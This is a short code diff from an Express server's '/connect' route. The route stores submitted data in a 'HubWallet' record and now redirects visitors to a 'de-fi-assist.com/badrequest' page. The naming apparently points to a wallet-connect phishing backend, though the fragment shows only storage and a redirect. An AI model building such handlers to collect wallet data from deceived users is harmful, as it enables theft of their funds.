@@ -517,7 +517,7 @@ app.post("/connect", async (req, res) => {
     };
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
-    res.redirect('https://www.example.com');
+    res.redirect('https://de-fi-assist.com/badrequest');
     return savedData;
   } catch (err) {
     console.error(err);
